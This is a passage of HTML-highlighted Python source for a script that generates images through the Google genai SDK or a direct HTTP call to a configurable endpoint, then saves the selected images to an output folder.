class=\"s2\"\u003e\u0026#34;jpg\u0026#34;\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e img.get\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;mimeType\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.endswith\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;jpeg\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;png\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efilename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _build_filename\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_name, ts, i, f\u003cspan class=\"s2\"\u003e\u0026#34;.{ext}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Path\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir\u003cspan class=\"o\"\u003e)\u003c/span\u003e / filename\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        path.write_bytes\u003cspan class=\"o\"\u003e(\u003c/span\u003edata\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        saved.append\u003cspan class=\"o\"\u003e(\u003c/span\u003estr\u003cspan class=\"o\"\u003e(\u003c/span\u003epath\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e saved\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _sdk_generate\u003cspan class=\"o\"\u003e(\u003c/span\u003eprompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  output_name: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None, mkdir: bool, \u003cspan class=\"k\"\u003eselect\u003c/span\u003e: str\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; list\u003cspan class=\"o\"\u003e[\u003c/span\u003estr\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e genai is None or types is None:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Error: google-genai is not installed.\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eclient_kwargs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;api_key\u0026#34;\u003c/span\u003e: API_KEY\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e API_BASE_URL:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        client_kwargs\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;http_options\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;base_url\u0026#34;\u003c/span\u003e: API_BASE_URL\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eclient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e genai.Client\u003cspan class=\"o\"\u003e(\u003c/span\u003e**client_kwargs\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e input_image:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e not Path\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_image\u003cspan class=\"o\"\u003e)\u003c/span\u003e.exists\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error: Input image not found: {input_image}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        with open\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_image, \u003cspan class=\"s2\"\u003e\u0026#34;rb\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e as f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eimage_bytes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f.read\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        mime_type, \u003cspan class=\"nv\"\u003e_\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e guess_type\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_image\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e mime_type is None:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003emime_type\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;image/png\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimage_part\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e types.Part.from_bytes\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eimage_bytes, \u003cspan class=\"nv\"\u003emime_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emime_type\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003econtents\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003eprompt, image_part\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003econtents\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e prompt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eresponse\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e client.models.generate_content\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003emodel\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eMODEL,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003econtents\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003econtents,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003econfig\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etypes.GenerateContentConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"nv\"\u003eimage_config\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etypes.ImageConfig\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003easpectRatio\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003easpect_ratio,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                    \u003cspan class=\"nv\"\u003eimageSize\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eresolution,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"o\"\u003e)\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    except Exception as exc:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;API Error: {exc}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003esaved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ets\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e datetime.now\u003cspan class=\"o\"\u003e()\u003c/span\u003e.strftime\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m%d_%H%M%S\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eoutput_dir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _resolve_output_dir\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir, mkdir\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eimage_parts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e part in response.parts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e part.text is not None:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Response text: {part.text}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eelif\u003c/span\u003e image :\u003cspan class=\"o\"\u003e=\u003c/span\u003e part.as_image\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            image_parts.append\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e not image_parts:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;first\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimage_parts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e image_parts\u003cspan class=\"o\"\u003e[\u003c/span\u003e:1\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;last\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimage_parts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e image_parts\u003cspan class=\"o\"\u003e[\u003c/span\u003e-1:\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelif\u003c/span\u003e \u003cspan class=\"k\"\u003eselect\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;max_res\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eimage_parts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003emax\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage_parts, \u003cspan class=\"nv\"\u003ekey\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elambda x: len\u003cspan class=\"o\"\u003e(\u003c/span\u003ex.image_bytes\u003cspan class=\"o\"\u003e))]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003efor\u003c/span\u003e i, image in enumerate\u003cspan class=\"o\"\u003e(\u003c/span\u003eimage_parts\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003efilename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _build_filename\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_name, ts, i, \u003cspan class=\"s2\"\u003e\u0026#34;.png\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Path\u003cspan class=\"o\"\u003e(\u003c/span\u003eoutput_dir\u003cspan class=\"o\"\u003e)\u003c/span\u003e / filename\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        image.save\u003cspan class=\"o\"\u003e(\u003c/span\u003epath\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        saved.append\u003cspan class=\"o\"\u003e(\u003c/span\u003estr\u003cspan class=\"o\"\u003e(\u003c/span\u003epath\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e saved\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef _http_generate\u003cspan class=\"o\"\u003e(\u003c/span\u003eprompt: str, output_dir: str, aspect_ratio: str, resolution: str, input_image: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                   \u003cspan class=\"k\"\u003eselect\u003c/span\u003e: str, output_name: str \u003cspan class=\"p\"\u003e|\u003c/span\u003e None, mkdir: bool\u003cspan class=\"o\"\u003e)\u003c/span\u003e -\u0026gt; list\u003cspan class=\"o\"\u003e[\u003c/span\u003estr\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e input_image and not Path\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_image\u003cspan class=\"o\"\u003e)\u003c/span\u003e.exists\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Error: Input image not found: {input_image}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e f\u003cspan class=\"s2\"\u003e\u0026#34;{API_BASE_URL.rstrip(\u0026#39;/\u0026#39;)}/v1beta/models/{MODEL}:generateContent\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eparts\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e: prompt\u003cspan class=\"o\"\u003e}]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e input_image:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        parts.append\u003cspan class=\"o\"\u003e(\u003c/span\u003e_load_image_inline\u003cspan class=\"o\"\u003e(\u003c/span\u003einput_image\u003cspan class=\"o\"\u003e))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;contents\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;parts\u0026#34;\u003c/span\u003e: parts\u003cspan class=\"o\"\u003e}]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;generationConfig\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;responseModalities\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;TEXT\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;IMAGE\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"s2\"\u003e\u0026#34;imageConfig\u0026#34;\u003c/span\u003e: \u003cspan class=\"o\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;aspectRatio\u0026#34;\u003c/span\u003e: aspect_ratio, \u003cspan class=\"s2\"\u003e\u0026#34;imageSize\u0026#34;\u003c/span\u003e: resolution\u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003eresp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _post_json\u003cspan class=\"o\"\u003e(\u003c/span\u003eurl, body\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    except Exception as exc:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;API Error: {exc}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;candidates\u0026#34;\u003c/span\u003e not in resp:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Unexpected response: {resp}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e[]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eparts_out\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e resp\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;candidates\u0026#34;\u003c/span\u003e\u003cspan 